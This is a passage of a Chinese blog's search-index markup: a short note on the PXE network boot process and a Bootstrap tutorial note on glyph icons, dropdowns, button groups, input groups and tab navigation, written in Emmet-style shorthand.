class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><h5 id="PXE工作过程"><a href="#PXE工作过程" class="headerlink" title="PXE工作过程"></a>PXE工作过程</h5><ol><li>启动 PXE客户端(通过DHCP协议从DHCP Server获得：<strong>IP地址，PXE地址，启动文件</strong>)</li><li>下载启动文件(使用TFTP协议，所以PXE服务器上还有TFTP服务器，用来响应PXE客户端的下载请求)</li><li>PXE客户端接收并执行文件；下载的文件会指示PXE客户端向TFTP服务器请求计算机的配置文件<code>pxelinux.cfg</code>(里面有内核、initramfs 等信息)，；读取配置文件请求安装所需文件。<img src="//tva3.sinaimg.cn/large/005zbIM7gy1g13ealadk1j30bf0bwq3k.jpg" alt="img"></li></ol><p>问题：</p><ol><li>PXE协议可以用来安装操作系统，但如果每次重启都安装操作刺痛。怎么让第一次安装操作系统，后面正常启动？</li><li>组网？</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5, 布局组件</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/5-%E5%B8%83%E5%B1%80%E7%BB%84%E4%BB%B6/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/5-%E5%B8%83%E5%B1%80%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="字体图标"><a href="#字体图标" class="headerlink" title="字体图标"></a>字体图标</h4><h5 id="依赖文件"><a href="#依赖文件" class="headerlink" title="依赖文件"></a>依赖文件</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="regexp">/fonts/g</span>lyphicons-halfings-regular.eot</span><br><span class="line">bootstrap<span class="regexp">/fonts/g</span>lyphicons-halfings-regular.svg</span><br><span class="line">bootstrap<span class="regexp">/fonts/g</span>lyphicons-halfings-regular.ttf</span><br><span class="line">bootstrap<span class="regexp">/fonts/g</span>lyphicons-halfings-regular.woff</span><br></pre></td></tr></table></figure><h5 id="字体图标列表"><a href="#字体图标列表" class="headerlink" title="字体图标列表"></a>字体图标列表</h5><p><a href="http://www.runoob.com/try/demo_source/bootstrap3-glyph-icons.htm">点击这里，查看可用的字体图标列表</a></p><h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;glyphicon glyphicon-search&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h5 id="实例-带字体图标的导航栏"><a href="#实例-带字体图标的导航栏" class="headerlink" title="实例-带字体图标的导航栏"></a>实例-带字体图标的导航栏</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">css  js</span><br><span class="line"></span><br><span class="line">&lt;!--<span class="selector-attr">[if lt IE 9]</span>&gt;</span><br><span class="line">&lt;script <span class="attribute">src</span>=<span class="string">&quot;https://apps.bdimg.com/libs/html5shiv/3.7/html5shiv.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;!<span class="selector-attr">[endif]</span>--&gt;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.navbar</span><span class="selector-class">.navbar-fixed-top</span><span class="selector-class">.navbar-inverse</span><span class="selector-attr">[role=navigation]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.container</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.navbar-header</span></span><br><span class="line">            <span class="selector-tag">button</span><span class="selector-class">.navbar-toggle</span><span class="selector-attr">[type=button]</span><span class="selector-attr">[data-toggle=collapse]</span><span class="selector-attr">[data-target=.navbar-collapse]</span></span><br><span class="line">                <span class="selector-tag">span</span>.sr-only&#123;Toggle navigation&#125;</span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.icon-bar</span></span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.icon-bar</span></span><br><span class="line">                span-<span class="attribute">icon</span>-bar</span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-class">.navbar-brand</span><span class="selector-attr">[href=#]</span>&#123;Project name&#125;</span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.collapse</span><span class="selector-class">.navbar-collapse</span></span><br><span class="line">            <span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.navbar-nav</span></span><br><span class="line">                <span class="selector-tag">li</span>.active&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span></span><br><span class="line">                    <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span>.glyphicon-home^&#123;Home&#125;</span><br><span class="line">                li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#shop]</span></span><br><span class="line">                    <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span>.glyphicon-shopping-cart^&#123;Shop&#125;</span><br><span class="line">                li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#support]</span></span><br><span class="line">                    <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span>.glyphicon-hradphones^&#123;Support&#125;</span><br><span class="line">                </span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g129o4k0a5j30m9024jr8.jpg" alt="img"><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g13hf9wdgxj309t01w742.jpg" alt="img">---#### 下拉菜单<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.dropdown</span></span><br><span class="line">    button<span class="selector-id">#dropdownMenu1</span><span class="selector-class">.btn</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">        &#123;主题&#125;</span><br><span class="line">        <span class="selector-tag">span</span><span class="selector-class">.caret</span></span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span></span><br><span class="line">        <span class="selector-tag">li</span>.dropdon-header&#123;下拉菜单标题&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[tabindex=-1]</span><span class="selector-attr">[href=#]</span></span><br><span class="line">            &#123;Java&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[tabindex=-1]</span><span class="selector-attr">[href=#]</span></span><br><span class="line">            &#123;数据挖掘&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[tbaindex=-1]</span><span class="selector-attr">[href=#]</span></span><br><span class="line">            &#123;数据通信/网络&#125;</span><br><span class="line">        <span class="selector-tag">li</span><span class="selector-class">.divider</span></span><br><span class="line">        <span class="selector-tag">li</span>.diveider&#123;下拉菜单标题&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[tabindex=-1]</span><span class="selector-attr">[href=#]</span>分离的链接</span><br><span class="line">-------</span><br><span class="line">可添加标题：li&gt;dropdown-<span class="selector-tag">header</span> </span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g13im9sz3rj305006tjrk.jpg" alt="img"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.dropdown</span></span><br><span class="line">    button<span class="selector-id">#dropdownMenu1</span><span class="selector-class">.btn</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span><span class="selector-class">.pull-right</span></span><br><span class="line">        li&gt;<span class="selector-tag">a</span></span><br><span class="line">        li&gt;<span class="selector-tag">a</span>...</span><br><span class="line">---------------</span><br><span class="line"> 向右对齐下拉菜单：<span class="selector-tag">ul</span>.pull-<span class="attribute">right</span></span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g13iiditacj30cf05fjrc.jpg" alt="img"><h4 id="按钮组"><a href="#按钮组" class="headerlink" title="按钮组"></a>按钮组</h4><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">btn-toolbar &gt; btn-<span class="keyword">group</span> &gt; btn btn-<span class="literal">default</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#通过按钮组调整组内按钮大小</span></span><br><span class="line">.btn-<span class="keyword">group</span>.btn-<span class="keyword">group</span>-lg</span><br></pre></td></tr></table></figure><h5 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span>.btn-default&#123;按钮<span class="number">1</span>&#125;</span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span>.btn-default&#123;按钮<span class="number">2</span>&#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">            &#123;下拉&#125;</span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.caret</span></span><br><span class="line">        <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span></span><br><span class="line">            li&gt;<span class="selector-tag">a</span><span class="selector-attr">[tabindex=-1]</span><span class="selector-attr">[href=#]</span>&#123;下拉链接<span class="number">1</span>&#125;</span><br><span class="line">            li&gt;<span class="selector-tag">a</span><span class="selector-attr">[tabindex=-1]</span><span class="selector-attr">[href=#]</span>&#123;下拉链接<span class="number">2</span>&#125;</span><br><span class="line">------------</span><br><span class="line">#垂直的按钮组</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group-vertical</span></span><br><span class="line">    <span class="selector-tag">div</span>.btn-group-vertical</span><br></pre></td></tr></table></figure><p><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g16s0pz7x5j308g03emx1.jpg" alt="img"></br><br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g16s3u7mz0j305d05yglh.jpg" alt="img"></p><h5 id="按钮插件-实现不同效果"><a href="#按钮插件-实现不同效果" class="headerlink" title="按钮插件-实现不同效果"></a>按钮插件-实现不同效果</h5><ol><li>加载状态   <code>data-loaing-text=&quot;Loading...&quot;</code><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">css js</span><br><span class="line">------------------</span><br><span class="line">button.btn.btn-primary[data-loading-text=Loading...][<span class="keyword">type</span>=button]&#123;加载状态&#125;</span><br><span class="line">script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      $(<span class="string">&quot;.btn&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="built_in">this</span>).button(<span class="string">&#x27;loading&#x27;</span>).delay(<span class="number">1000</span>).queue(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            $(<span class="built_in">this</span>).button(<span class="string">&#x27;reset&#x27;</span>);</span><br><span class="line">            $(<span class="built_in">this</span>).dequeue();</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></li><li>单个切换   <code>data-toggle=button</code><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span><span class="selector-attr">[data-toggle=button]</span>&#123;单个切换&#125;</span><br></pre></td></tr></table></figure></li><li>复选框    <code>data-toggle=buttons</code><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group</span><span class="selector-attr">[data-toggle=buttons]</span></span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span></span><br><span class="line">        &#123;选项<span class="number">1</span>&#125;</span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span></span><br><span class="line">        &#123;选项<span class="number">2</span>&#125;</span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span></span><br><span class="line">        &#123;选项<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></li><li>单选按钮   <code>data-toggle=buttons</code><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group</span><span class="selector-attr">[data-toggle=buttons]</span></span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-attr">[type=radio]</span><span class="selector-attr">[name=options]</span><span class="selector-attr">[id=option1]</span></span><br><span class="line">        &#123;选项<span class="number">1</span>&#125;</span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-attr">[type=radio]</span><span class="selector-attr">[name=options]</span><span class="selector-attr">[id=option2]</span></span><br><span class="line">        &#123;选项<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure></li><li>折叠？  ```data-toggle=collapse</li></ol><p>*. 启用插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tooggle   loading   reset  [string]  </span><br></pre></td></tr></table></figure><h4 id="按钮下拉菜单"><a href="#按钮下拉菜单" class="headerlink" title="按钮下拉菜单"></a>按钮下拉菜单</h4><h5 id="分割的按钮下拉菜单"><a href="#分割的按钮下拉菜单" class="headerlink" title="分割的按钮下拉菜单"></a>分割的按钮下拉菜单</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;默认&#125;</span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[type=button]</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">        <span class="selector-tag">span</span><span class="selector-class">.caret</span></span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span></span><br><span class="line">        li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;功能&#125;</span><br><span class="line">        <span class="selector-tag">li</span><span class="selector-class">.divider</span></span><br><span class="line">        li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;分离的链接&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g16vgef9jcj306504d3ye.jpg" alt="img">##### 按钮下拉菜单大小<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-class">.btn-lg</span>.dropdown-toggle</span><br></pre></td></tr></table></figure><h5 id="按钮上拉菜单"><a href="#按钮上拉菜单" class="headerlink" title="按钮上拉菜单"></a>按钮上拉菜单</h5><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">div</span>.btn-<span class="keyword">group</span>  ==&gt;&gt;  <span class="keyword">div</span>.btn-<span class="keyword">group</span>.dropup</span><br></pre></td></tr></table></figure><h4 id="输入框组"><a href="#输入框组" class="headerlink" title="输入框组"></a>输入框组</h4><p>扩展自<a href="http://www.runoob.com/bootstrap/bootstrap-forms.html">表单控件</a>。</p><h5 id="基本的输入框组-前缀与后缀"><a href="#基本的输入框组-前缀与后缀" class="headerlink" title="基本的输入框组(前缀与后缀)"></a>基本的输入框组(前缀与后缀)</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">div[style=padding:<span class="number">100</span>px <span class="number">100</span>px <span class="number">10</span>px;]</span><br><span class="line">    form</span><br><span class="line">        div.<span class="keyword">input</span>-<span class="keyword">group</span></span><br><span class="line">            span.<span class="keyword">input</span>-<span class="keyword">group</span>-addon&#123;@&#125;</span><br><span class="line">            <span class="keyword">input</span>.form-control[<span class="keyword">type</span>=<span class="type">text</span>][placeholder=twitterhandle]</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        div.<span class="keyword">input</span>-<span class="keyword">group</span></span><br><span class="line">            <span class="keyword">input</span>.form-control[<span class="keyword">type</span>=<span class="type">text</span>]</span><br><span class="line">            span.<span class="keyword">input</span>-<span class="keyword">group</span>-addon&#123;<span class="number">.00</span>&#125;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        div.<span class="keyword">input</span>-<span class="keyword">group</span></span><br><span class="line">            span.<span class="keyword">input</span>-<span class="keyword">group</span>-addon&#123;$&#125;</span><br><span class="line">            <span class="keyword">input</span>.form-control[<span class="keyword">type</span>=<span class="type">text</span>]</span><br><span class="line">            span.<span class="keyword">input</span>-<span class="keyword">group</span>-addon&#123;<span class="number">.00</span>&#125;</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g16wuoogpgj309904ba9w.jpg" alt="img"><h5 id="输入框组大小"><a href="#输入框组大小" class="headerlink" title="输入框组大小"></a>输入框组大小</h5><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">form</span><br><span class="line">    div.<span class="meta">input</span>-<span class="meta">group</span>.<span class="meta">input</span>-<span class="meta">group</span>-lg</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><h5 id="带有-复选框和单选插件-的输入组"><a href="#带有-复选框和单选插件-的输入组" class="headerlink" title="带有 复选框和单选插件 的输入组"></a>带有 复选框和单选插件 的输入组</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span></span><br><span class="line">    <span class="selector-tag">form</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">            <span class="selector-tag">div</span><span class="selector-class">.input-group</span></span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.input-group-addon</span></span><br><span class="line">                    <span class="selector-tag">input</span><span class="selector-attr">[type=chekbox]</span></span><br><span class="line">                <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">            <span class="selector-tag">div</span><span class="selector-class">.input-group</span></span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.input-group-addon</span></span><br><span class="line">                    <span class="selector-tag">input</span><span class="selector-attr">[type=radon]</span></span><br><span class="line">                <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">------------------------</span><br><span class="line"><span class="selector-tag">div</span>.input-group&gt;<span class="selector-tag">span</span>.input-group-adddon</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g16xbpu530j307o0350si.jpg" alt="img"><h5 id="带有-按钮插件-的输入组"><a href="#带有-按钮插件-的输入组" class="headerlink" title="带有 按钮插件 的输入组"></a>带有 按钮插件 的输入组</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-attr">[style=padding:100px 100px 10px]</span></span><br><span class="line">    <span class="selector-tag">form</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">            <span class="selector-tag">div</span><span class="selector-class">.input-group</span></span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.input-group-btn</span></span><br><span class="line">                    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-attr">[type=button]</span>&#123;Go&#125;</span><br><span class="line">                <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">--------------------</span><br><span class="line"><span class="selector-tag">div</span>.input-group&gt;<span class="selector-tag">span</span>.input-group-btn</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g17widjsvoj306u02aa9v.jpg" alt="img"><h5 id="带有-下拉菜单按钮-的输入组"><a href="#带有-下拉菜单按钮-的输入组" class="headerlink" title="带有 下拉菜单按钮 的输入组"></a>带有 下拉菜单按钮 的输入组</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span></span><br><span class="line">  <span class="selector-tag">form</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">      <span class="selector-tag">div</span><span class="selector-class">.input-group</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.input-group-btn</span></span><br><span class="line">            <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[type=button]</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">                &#123;下拉菜单&#125;</span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.caret</span></span><br><span class="line">            <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span></span><br><span class="line">                li&gt;<span class="selector-tag">a</span></span><br><span class="line">                li&gt;<span class="selector-tag">a</span></span><br><span class="line">------------------</span><br><span class="line"><span class="selector-tag">div</span>.input-group&gt;<span class="selector-tag">div</span>.input-group-btn</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g17wjbvbwlj306t02bglg.jpg" alt="img"><h4 id="导航元素"><a href="#导航元素" class="headerlink" title="导航元素"></a>导航元素</h4><h5 id="标签式导航菜单"><a href="#标签式导航菜单" class="headerlink" title="标签式导航菜单"></a>标签式导航菜单</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.container</span></span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.nav-tabs</span></span><br><span class="line">        <span class="selector-tag">li</span><span class="selector-class">.active</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[href=#home]</span>&#123;首页&#125;</span><br><span class="line">        li&gt;<span class="selector-tag">a</span><span class="selector-attr">[data-toggle=tab]</span><span class="selector-attr">[href=#menu1]</span>&#123;菜单<span class="number">1</span>&#125;</span><br><span class="line">        li&gt;<span class="selector-tag">a</span><span class="selector-attr">[data-toggle=tab]</span><span class="selector-attr">[href=#menu2]</span>&#123;菜单<span class="number">2</span>&#125;</span><br><span class="line">        ...</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.tab-content</span></span><br><span class="line">        div<span class="selector-id">#home</span><span class="selector-class">.tab-pane</span><span class="selector-class">.fade</span><span class="selector-class">.in</span><span class="selector-class">.active</span></span><br><span class="line">            h3&#123;首页&#125;</span><br><span class="line">            p&#123;一堆话&#125;</span><br><span class="line">        div<span class="selector-id">#menu1</span><span class="selector-class">.tab-pane</span><span class="selector-class">.fade</span></span><br><span class="line">            h3&#123;菜单<span class="number">1</span>&#125;</span><br><span class="line">            p&#123;有一堆话&#125;</span><br><span class="line">-------------</span><br><span class="line">fade  内容逐渐消失</span><br><span class="line"><span class="keyword">in</span>    初始化时，tab-pane显示的内容</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g180v4nyvlj30aw031jr9.jpg" alt="img"><h5 id="胶囊式导航菜单"><a href="#胶囊式导航菜单" class="headerlink" title="胶囊式导航菜单"></a>胶囊式导航菜单</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 